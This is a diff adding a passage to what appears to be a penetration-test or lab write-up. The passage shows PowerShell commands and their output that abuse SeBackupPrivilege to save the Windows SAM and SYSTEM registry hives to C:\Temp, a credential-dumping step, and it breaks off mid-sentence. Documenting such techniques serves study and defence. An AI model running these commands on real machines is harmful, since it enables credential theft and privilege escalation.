@@ -458,3 +458,35 @@ So none of these credenatials are valid so ill keep enumerating in my RDP sessio
 # Abusing SeBackupPrivilege on windows workstation
 After opening powershell as as an administrator and checking privs i have the `SeBackupPrivilege` 
 
+```python
+PS C:\> mkdir Temp
+
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         3/17/2026   4:09 PM                Temp
+
+
+PS C:\> reg save hklm\sam c:\Temp\sam
+The operation completed successfully.
+PS C:\> reg save hklm\system c:\Temp\system
+The operation completed successfully.
+PS C:\> cd Temp
+PS C:\Temp> dir
+
+
+    Directory: C:\Temp
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         3/17/2026   4:09 PM         110592 sam
+-a----         3/17/2026   4:09 PM       17408000 system
+
+
+PS C:\Temp>
+```
+This backed both files up to the `C:\Temp` dir now i will put them in the 
